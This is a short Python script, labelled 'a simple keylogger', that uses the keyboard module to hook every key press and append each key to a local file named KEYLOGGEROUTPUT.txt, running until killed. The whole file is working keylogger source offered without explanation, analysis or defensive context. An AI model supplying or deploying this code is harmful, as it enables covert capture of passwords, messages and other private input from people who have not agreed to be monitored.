"A simple keylogger using the keyboard module in python"



import keyboard 

def storedata(data):
    with open("KEYLOGGEROUTPUT.txt","a") as file:
        file.write(data)


def words(char):
    if char == "space":
        return " "
    elif len(char)> 1:
        return "[%s]" % char
    else:
        return char 


def wordrecord(event):
    storedata(words(event.name));


keyboard.on_press(wordrecord)
keyboard.wait()